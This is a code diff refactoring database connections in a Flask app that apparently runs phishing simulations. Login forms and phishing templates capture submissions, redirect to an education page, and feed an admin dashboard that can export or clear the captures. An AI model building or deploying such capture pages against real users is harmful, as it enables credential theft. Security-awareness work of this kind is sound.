@@ -20,17 +20,30 @@ def async_route(f):
     """Decorator to handle async routes in Flask"""
     @wraps(f)
     def wrapper(*args, **kwargs):
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
         try:
+            loop = asyncio.get_event_loop()
+        except RuntimeError:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+        
+        if loop.is_running():
+            # If loop is already running, create a new task
+            import concurrent.futures
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                future = executor.submit(asyncio.run, f(*args, **kwargs))
+                return future.result()
+        else:
             return loop.run_until_complete(f(*args, **kwargs))
-        finally:
-            loop.close()
     return wrapper
+
+async def ensure_connected():
+    """Ensure database is connected"""
+    if not db.is_connected():
+        await db.connect()
 
 async def get_stats():
     """Calculate real statistics from database"""
-    await db.connect()
+    await ensure_connected()
     
     try:
         # Get total attempts
@@ -70,8 +83,6 @@ async def get_stats():
             'unique_ips': 0,
             'today_attempts': 0
         }
-    finally:
-        await db.disconnect()
 
 @app.route('/', methods=['GET', 'POST'])
 @async_route
@@ -92,7 +103,7 @@ async def login():
                 pass
         
         # Save to database
-        await db.connect()
+        await ensure_connected()
         try:
             await db.capture.create(
                 data={
@@ -105,8 +116,6 @@ async def login():
             )
         except Exception as e:
             print(f"Error saving capture: {e}")
-        finally:
-            await db.disconnect()
         
         return redirect(url_for('education'))
     
@@ -139,7 +148,7 @@ async def admin():
     if not session.get('logged_in'):
         return redirect(url_for('admin_login'))
     
-    await db.connect()
+    await ensure_connected()
     
     try:
         # Get all captures ordered by newest first
@@ -178,8 +187,6 @@ async def admin():
             'unique_ips': 0,
             'today_attempts': 0
         })
-    finally:
-        await db.disconnect()
 
 @app.route('/admin/clear_data', methods=['POST'])
 @async_route
@@ -187,15 +194,13 @@ async def clear_data():
     if not session.get('logged_in'):
         return redirect(url_for('admin_login'))
     
-    await db.connect()
+    await ensure_connected()
     
     try:
         await db.capture.delete_many()
         print("All capture data cleared")
     except Exception as e:
         print(f"Error clearing data: {e}")
-    finally:
-        await db.disconnect()
     
     return redirect(url_for('admin'))
 
@@ -205,7 +210,7 @@ async def export_data():
     if not session.get('logged_in'):
         return redirect(url_for('admin_login'))
     
-    await db.connect()
+    await ensure_connected()
     
     try:
         captures = await db.capture.find_many(
@@ -231,8 +236,6 @@ async def export_data():
     except Exception as e:
         print(f"Error exporting data: {e}")
         return redirect(url_for('admin'))
-    finally:
-        await db.disconnect()
 
 @app.route('/logout')
 def logout():
@@ -258,7 +261,7 @@ async def phishing_template(template_name):
                 pass
         
         # Save to database
-        await db.connect()
+        await ensure_connected()
         try:
             await db.capture.create(
                 data={
@@ -271,8 +274,6 @@ async def phishing_template(template_name):
             )
         except Exception as e:
             print(f"Error saving capture: {e}")
-        finally:
-            await db.disconnect()
         
         return redirect(url_for('education'))
     
@@ -304,17 +305,8 @@ async def api_stats():
 def health():
     return jsonify({'status': 'healthy', 'timestamp': datetime.datetime.now().isoformat()})
 
-# Initialize database on startup
-@app.before_first_request
-@async_route
-async def initialize_database():
-    try:
-        await db.connect()
-        print("Database connected successfully")
-    except Exception as e:
-        print(f"Database connection error: {e}")
-    finally:
-        await db.disconnect()
+# Export the Flask app for Vercel
+application = app
 
 if __name__ == '__main__':
     app.run(debug=True)
